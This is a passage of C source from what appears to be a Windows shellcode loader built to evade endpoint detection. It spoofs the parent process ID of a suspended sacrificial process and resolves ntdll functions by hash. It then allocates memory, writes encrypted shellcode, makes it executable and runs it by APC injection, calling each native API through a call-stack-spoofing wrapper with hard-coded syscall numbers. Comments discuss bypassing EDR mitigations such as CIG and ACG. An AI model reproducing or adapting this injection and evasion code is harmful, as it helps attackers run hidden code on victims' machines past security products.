        // Perform additional error handling as needed
    }

    pattern();

    getchar();

    // ================ END: NtOpenProcess() =============================

    // ===================== Sacrificial Process ==========================================================

    // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

    // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);

    // Initialise our list 
    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize))
    {
        printf("[!] InitializeProcThreadAttributeList Failed With Error : %u \n", GetLastError());
        return 1;
    }

    // Assign PPID Spoof attribute:
    if (!UpdateProcThreadAttribute(si.lpAttributeList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProc, sizeof(HANDLE), NULL, NULL))
    {
        printf("[!] UpdateProcThreadAttribute Failed With Error 1 : %u \n", GetLastError());
        return 1;
    }


    // ============================================================= CIG and ACG Mitigation ===============================================================
    
    // Although EDR vendors like CrowdStrike Falcon signs their Injection DLL with MS rendering CIG as useless! (https://twitter.com/Sektor7Net/status/1187818929512730626)
    // For ACG Thing: Remotes processes (i.e EDRs) could use VirtualAllocEx and WriteProcessMemory to write and execute shellcode/dll in an ACG enabled process rendering ACG useless.
    // https://www.ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy

    // ============================================================= CIG and ACG Mitigation ===============================================================

    pattern();

    // Finally, create the process
    //int stats = CreateProcessA(NULL, (LPSTR)SPAWN, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, (LPCSTR)"c:\\windows\\system32\\", &si.StartupInfo, &pi);
    //int stats = CreateProcessA(NULL, (LPSTR)SPAWN, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, (LPCSTR)"C:\\Users\\HP\\AppData\\Roaming\\Zoom\\bin\\", &si.StartupInfo, &pi);

    int stats = CreateProcessA(NULL, (LPSTR)SPAWN, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, (LPCSTR)SPAWN_DIR, &si.StartupInfo, &pi);

    //status = CreateProcessA(NULL, (LPSTR)SPAWN, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
    if (stats == NULL)
    {
        printf("[!] CreateProcessA Failed With Error : %u \n", GetLastError());
        return 1;
    }
    
    DWORD dwProcessId = pi.dwProcessId;
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    DWORD dwThreadId = pi.dwThreadId;

    printf("[+] Spawned %s | process handle: 0x%X | PID: %d | thread handle: 0x%X | TID: %d\n", SPAWN, hProcess, dwProcessId, hThread, dwThreadId);

    pattern();
/*

   /////////////////////////////////////////////// NtCreateUserProcess //////////////////////////////////////////////////////

    pattern();

    //DWORD dwProcessId = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

   //if (!NtCreateUserProcessForthree((PWSTR)TARGET_PROCESS, (PWSTR)PROCESS_PARMS, (PWSTR)PROCESS_PATH, hParentProc, &hProcess, &hThread))
   if (!NtCreateUserProcessForthree((PWSTR)TARGET_PROCESS, (PWSTR)PROCESS_PARMS, (PWSTR)PROCESS_PATH, hParentProc, &hProcess, &hThread))
   {
        printf("[!] NtCreateUserProcess Failed With Error : %u \n", GetLastError());
        return -1;
   }

    //printf("[+] Spawned %s | process handle: 0x%X | thread handle: 0x%X\n", SPAWN, hProcess, hThread);
    printf("[+] Spawned %S | process handle: 0x%X | PID: %d | thread handle: 0x%X | TID: %d\n", (PWSTR)TARGET_PROCESS, hProcess, GetProcessId(hProcess), hThread, GetThreadId(hThread));

    printf("[+] Check!");  getchar();

    pattern();

    /////////////////////////////////////////////// NtCreateUserProcess ///////////////////////////////////////////////////
*/
    // ========================== NtSuspendThread() ============================
    /*
    pattern();

    // Resolve NtSuspendThread API address: 0x684C5D702FF4D3B0
	PVOID pNtSuspendThread = ResolveNtAPI(hDLL_ntdll, 0x684C5D702FF4D3B0);

    // Now you can use the function
    ULONG previousSuspendCount;

    p.ssn = (PVOID)0x1be;

    // Opening a handle to the parent process to enable PPID spoofing
    PVOID spoofResult_sus = Spoof(hThread, &previousSuspendCount, NULL, NULL, &p, pNtSuspendThread, (PVOID)0);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    // SuspendThread(hThread, &previousSuspendCount);

    // Check the returned value
    if (spoofResult_sus == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtSuspendThread\n");
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult, GetLastError());
        // Perform additional error handling as needed
    }

    pattern();
    */
    // ========================== END: NtSuspendThread() ============================

    // ================ NtAllocateVirtualMemory() =============================

    pattern();

    // Resolve NtAllocateVirtualMemory API address: 0xF5BD373480A6B89B
	PVOID pNtAllocateVirtualMemory = ResolveNtAPI(hDLL_ntdll, 0xF5BD373480A6B89B);

    //PVOID pNtAllocateVirtualMemory = (PBYTE)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"));

    p.ssn = (PVOID)0x18;

    //Spoof((PVOID)(-1), &BaseAddress, NULL, &shellcode_size2, &p, pNtAllocateVirtualMemory, (PVOID)2, (PVOID)(MEM_COMMIT | MEM_RESERVE), (PVOID)PAGE_READWRITE);
    PVOID spoofResult1 = Spoof(hProcess, &BaseAddress, 0, &shellcode_size2, &p, pNtAllocateVirtualMemory, (PVOID)2, (PVOID)(MEM_COMMIT | MEM_RESERVE), (PVOID)PAGE_READWRITE);
    //PVOID spoofResult1 = Spoof(hProcess, &BaseAddress, 0, &shellcode_size2, &p, pNtAllocateVirtualMemory, (PVOID)2, (PVOID)(MEM_COMMIT | MEM_RESERVE), (PVOID)PAGE_EXECUTE_READWRITE);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    // NtAllocateVirtualMemory(MyCurrentProcess(), &BaseAddress, 0, &shellcode_size2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Check the returned value
    if (spoofResult1 == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtAllocateVirtualMemory\n");
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult1, GetLastError());
        // Perform additional error handling as needed
    }

    //printf("\n[+] Called NtAllocateVirtualMemory\n");

    pattern();

    // ================ END: NtAllocateVirtualMemory() =============================


    // ======================== NtWriteVirtualMemory() =================================

    pattern();

    p.ssn = (PVOID)0x3a;

    // Resolve NtWriteVirtualMemory API address: 0x68A3C2BA486F0741
	PVOID pNtWriteVirtualMemory = ResolveNtAPI(hDLL_ntdll, 0x68A3C2BA486F0741);

    PVOID spoofResult2 = Spoof(hProcess, BaseAddress, enc_shellcode_bin, shcSize, &p, pNtWriteVirtualMemory, (PVOID)1, (PVOID)NULL);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    //NtWriteVirtualMemory(hProcess, BaseAddress, enc_shellcode_bin, shcSize, NULL);

    // Check the returned value
    if (spoofResult2 == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtWriteVirtualMemory\n");
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult2, GetLastError());
        // Perform additional error handling as needed
    }

    pattern();

    // =============================== END: NtWriteVirtualMemory() ==============================================

    // ==================== NtProtectVirtualMemory() ==========================

    pattern();

    // NtProtectVirtualMemory: 0x858BCB1046FB6A37
    PVOID pNtProtectVirtualMemory = ResolveNtAPI(hDLL_ntdll, 0x858BCB1046FB6A37);
    
    DWORD OldProtect = 0;
    
    p.ssn = (PVOID)0x50;

    PVOID spoofResult3 = Spoof(hProcess, &BaseAddress, &shellcode_size2, PAGE_EXECUTE_READ, &p, pNtProtectVirtualMemory, (PVOID)1, &OldProtect);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    // NtProtectVirtualMemory(MyCurrentProcess(), &BaseAddress, &shellcode_size2, PAGE_EXECUTE_READ, &OldProtect);

    // Check the returned value
    if (spoofResult3 == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtProtectVirtualMemory\n");
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult3, GetLastError());
        // Perform additional error handling as needed
    }

    //printf("\n[+] Called NtProtectVirtualMemory\n");

    pattern();

    getchar();

    // ==================== END: NtProtectVirtualMemory() ==========================

	// ====================== NtQueueApcThread =======================================

    pattern();

    // NtQueueApcThread: 0x7073ED9F921A0267
    PVOID pNtQueueApcThread = ResolveNtAPI(hDLL_ntdll, 0x7073ED9F921A0267);

    p.ssn = (PVOID)0x45;

    //LPVOID pAlloc = BaseAddress;
    PVOID pAlloc = BaseAddress;

    //PVOID spoofResult4 = (hThread, (PTHREAD_START_ROUTINE)pAlloc, pAlloc, NULL, &p, pNtQueueApcThread, (PVOID)1, NULL);
    PVOID spoofResult4 = Spoof(hThread, pAlloc, NULL, NULL, &p, pNtQueueApcThread, (PVOID)1, NULL);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    // NtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAlloc, pAlloc, NULL, NULL);

    // Check the returned value
    if (spoofResult4 == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtQueueApcThread\n");
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult4, GetLastError());
        // Perform additional error handling as needed
    }

    pattern();

    // ====================== END: NtQueueApcThread =======================================

    // ================================= NtResumeThread ==========================================

    pattern();

    // NtResumeThread: 0xA5073BCB80D0459F
    PVOID pNtResumeThread = ResolveNtAPI(hDLL_ntdll, 0xA5073BCB80D0459F);

    p.ssn = (PVOID)0x52;

    ULONG previousSuspendCount;

    PVOID spoofResult5 = Spoof(hThread, &previousSuspendCount, NULL, NULL, &p, pNtResumeThread, (PVOID)0);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    // NtResumeThread(hThread, &previousSuspendCount)

    // Check the returned value
    if (spoofResult5 == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtResumeThread\n");
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult5, GetLastError());
        // Perform additional error handling as needed
    }


    pattern();
    
    // ================================= END: NtResumeThread ==========================================

    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, si.lpAttributeList);
    
    printf("[+] DONE \n\n");

    CloseHandle(hProcess);
    CloseHandle(hThread);

    pattern();

    //printf("[+] Called Sleep\n");
    
    //Spoof((PVOID)INFINITE, NULL, NULL, NULL, &p, Sleep, (PVOID)0);

    printf("[+] Calling NtDelayExecution\n\n");

    // Already Unhooked: No need
    //p.ssn = (PVOID)0x34;

    LARGE_INTEGER SleepUntil;

    DWORD ms = 100;
    //DWORD ms = 10000;
    //DWORD ms = 100000;
    
    // Code: https://evasions.checkpoint.com/techniques/timing.html
    GetSystemTimeAsFileTime((LPFILETIME)&SleepUntil);
    SleepUntil.QuadPart += (ms * 10000);

    // NtDelayExecution: 0x38B4C532C801E879
    PVOID pNtDelay = ResolveNtAPI(hDLL_ntdll, 0x38B4C532C801E879);

    //PVOID pNtDelay = (PBYTE)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution"));

    PVOID spoofResult6 = Spoof((PVOID)TRUE, &SleepUntil, NULL, NULL, &p, pNtDelay, (PVOID)0);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    // NtDelayExecution(TRUE, &SleepUntil);

    // Check the returned value
    if (spoofResult6 == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtDelayExecution\n");
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult6, GetLastError());
        // Perform additional error handling as needed
    }

    pattern();

    return 0;
}
